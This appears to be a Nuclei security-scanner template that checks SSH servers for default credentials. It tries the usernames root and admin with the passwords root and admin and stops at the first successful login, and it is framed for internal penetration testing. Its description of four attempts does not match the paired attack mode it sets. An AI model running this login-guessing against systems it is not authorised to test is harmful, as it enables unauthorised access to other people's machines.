id: ssh-mini-brute

info:
  name: SSH Mini Brute - 2x2 Dictionary
  author: penetration-team
  severity: high
  description: |
    Detects weak/default SSH credentials using a minimal 2-user x 2-password dictionary.
    Designed for internal network penetration testing with minimal account lockout risk.
    MAX 4 ATTEMPTS. Stops at first match.
  metadata:
    max-request: 4
  tags: js,ssh,network

javascript:
  - pre-condition: |
      var m = require("nuclei/ssh");
      var c = m.SSHClient();
      var response = c.ConnectSSHInfoMode(Host, Port);
      response["UserAuth"].includes("password")
    code: |
      var m = require("nuclei/ssh");
      var c = m.SSHClient();
      c.Connect(Host,Port,Username,Password);
    args:
      Host: "{{Host}}"
      Port: "22"
      Username: "{{usernames}}"
      Password: "{{passwords}}"
    threads: 1
    attack: pitchfork
    stop-at-first-match: true
    payloads:
      usernames:
        - root
        - admin
      passwords:
        - root
        - admin
    matchers:
      - type: dsl
        dsl:
          - "response == true"
          - "success == true"
        condition: and
# digest: 4b0a00483046022100a073fb40fc9cb46e6e006255a906d7e667c645f64fce9bd398f9f0108c009c03022100819f9d128c02d8a57b8ff97b8e502ab6f8bf9317ad348c48fd390c3bae351d1e:7ec931ac1b7d2e9f67f639e8d62a6615
